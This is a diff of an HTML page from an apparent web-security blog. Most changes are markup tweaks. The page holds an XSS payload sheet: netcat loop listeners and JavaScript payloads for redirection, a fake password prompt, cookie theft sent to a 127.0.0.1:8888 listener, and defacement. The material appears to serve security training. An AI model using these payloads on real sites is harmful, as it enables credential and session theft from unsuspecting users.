@@ -6,7 +6,6 @@
         <meta name="author" content="Tim Tomes">
         <meta name="description" content="Articles, information, and projects related to development and web application security.">
         <meta name="viewport" content="width=device-width, initial-scale=1">
-        <link rel="alternate" href="/atom.xml" title="Recent Articles" type="application/atom+xml">
         <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway:400,300,600" type="text/css">
         <link rel="stylesheet" href="/static/css/normalize.css">
         <link rel="stylesheet" href="/static/css/skeleton.css">
@@ -22,11 +21,10 @@
                         <li><a href="/"><img src="https://www.gravatar.com/avatar/0a6d9b1ad59ad436bf9d9d16b2a7133e.png?s=128" class="avatar" /></a></li>
                                             <li><a href="https://bitbucket.org/lanmaster53" target="_blank"><img src="/static/images/meta/bitbucket.png" /></a></li>
                                             <li><a href="https://github.com/lanmaster53" target="_blank"><img src="/static/images/meta/github.png" /></a></li>
-                                            <li><a href="https://www.youtube.com/user/lanmaster53" target="_blank"><img src="/static/images/meta/youtube.png" /></a></li>
                                             <li><a href="https://twitter.com/lanmaster53" target="_blank"><img src="/static/images/meta/twitter.png" /></a></li>
                                             <li><a href="https://www.linkedin.com/in/lanmaster53" target="_blank"><img src="/static/images/meta/linkedin.png" /></a></li>
+                                            <li><a href="https://www.youtube.com/user/lanmaster53" target="_blank"><img src="/static/images/meta/youtube.png" /></a></li>
                                             <li><a href="/contact/"><img src="/static/images/meta/email.png"></a></li>
-                        <li><a href="/atom.xml"><img src="/static/images/meta/feed.png"></a></li>
                     </ul>
                 </div>
                 <div class="eight columns nav">
@@ -57,40 +55,40 @@
 
 <h3>Listeners</h3>
 <h4>Linux</h4>
-<div class="codehilite"><pre><span></span>while :; do printf &quot;j$ &quot;; read c; printf &quot;HTTP/1.1 200 OK\n\n$c&quot; | nc -lp 8000 &gt;/dev/null; done
-</pre></div>
+<div class="codehilite"><pre><span></span><code>while :; do printf &quot;j$ &quot;; read c; printf &quot;HTTP/1.1 200 OK\n\n$c&quot; | nc -lp 8000 &gt;/dev/null; done
+</code></pre></div>
 
 
 <h4>OS X</h4>
-<div class="codehilite"><pre><span></span>while :; do printf &quot;j$ &quot;; read c; printf &quot;HTTP/1.1 200 OK\n\n$c&quot; | nc -l 8000 &gt;/dev/null; done
-</pre></div>
+<div class="codehilite"><pre><span></span><code>while :; do printf &quot;j$ &quot;; read c; printf &quot;HTTP/1.1 200 OK\n\n$c&quot; | nc -l 8000 &gt;/dev/null; done
+</code></pre></div>
 
 
 <h3>Example Payloads</h3>
 <h4>Redirection</h4>
-<div class="codehilite"><pre><span></span>window.location = &#39;http://lanmaster53.com/training/&#39;
-</pre></div>
+<div class="codehilite"><pre><span></span><code>window.location = &#39;http://lanmaster53.com/training/&#39;
+</code></pre></div>
 
 
 <h4>Phishing</h4>
-<div class="codehilite"><pre><span></span>i=new Image();i.src=&quot;http://127.0.0.1:8888/pw/&quot;+prompt(&quot;Password:&quot;)
-</pre></div>
+<div class="codehilite"><pre><span></span><code>i=new Image();i.src=&quot;http://127.0.0.1:8888/pw/&quot;+prompt(&quot;Password:&quot;)
+</code></pre></div>
 
 
 <ul>
 <li>Requires a second listener, e.g. <code>python -m "SimpleHTTPServer" 8888</code>.</li>
 </ul>
 <h4>Session Hijacking</h4>
-<div class="codehilite"><pre><span></span>i=new Image();i.src=&quot;http://127.0.0.1:8888/pw/&quot;+document.cookie
-</pre></div>
+<div class="codehilite"><pre><span></span><code>i=new Image();i.src=&quot;http://127.0.0.1:8888/pw/&quot;+document.cookie
+</code></pre></div>
 
 
 <ul>
 <li>Requires a second listener, e.g. <code>python -m "SimpleHTTPServer" 8888</code>.</li>
 </ul>
 <h4>Defacement</h4>
-<div class="codehilite"><pre><span></span>d=document;e=d.createElement(&quot;p&quot;);e.innerHTML=&quot;lanmaster53 wuz here!&quot;;d.body.appendChild(e)
-</pre></div>
+<div class="codehilite"><pre><span></span><code>d=document;e=d.createElement(&quot;p&quot;);e.innerHTML=&quot;lanmaster53 wuz here!&quot;;d.body.appendChild(e)
+</code></pre></div>
 
 
 <h3>Credits</h3>
